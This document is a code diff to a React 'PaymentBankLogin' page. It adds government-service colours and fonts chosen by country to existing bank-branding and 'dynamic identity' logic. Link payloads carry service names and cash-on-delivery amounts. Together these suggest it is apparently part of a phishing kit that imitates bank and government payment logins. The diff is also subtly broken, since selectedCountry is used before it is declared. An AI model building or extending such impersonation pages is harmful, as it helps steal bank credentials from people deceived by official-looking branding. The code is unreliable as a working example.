@@ -17,6 +17,8 @@ import BankLogo from "@/components/BankLogo";
 import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
 import { designSystem } from "@/lib/designSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { isGovernmentService } from "@/lib/governmentPaymentServices";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -51,7 +53,17 @@ const PaymentBankLogin = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
+  // Check if government service
+  const isGovService = isGovernmentService(serviceKey);
+  const govSystem = getGovernmentPaymentSystem(selectedCountry);
+  
   const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
+  
+  // Use government theme if it's a government service
+  const primaryColor = isGovService ? govSystem.colors.primary : (selectedBankBranding?.colors?.primary || branding.colors.primary);
+  const secondaryColor = isGovService ? govSystem.colors.secondary : (selectedBankBranding?.colors?.secondary || branding.colors.secondary);
+  const surfaceColor = isGovService ? govSystem.colors.surface : '#F8F9FA';
+  const fontFamily = isGovService ? govSystem.fonts.primaryAr : 'Cairo, Tajawal, sans-serif';
   const selectedCountry = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || "SA";
   const shippingInfo = linkData?.payload as any;
   const rawAmount = amountParam || shippingInfo?.cod_amount;
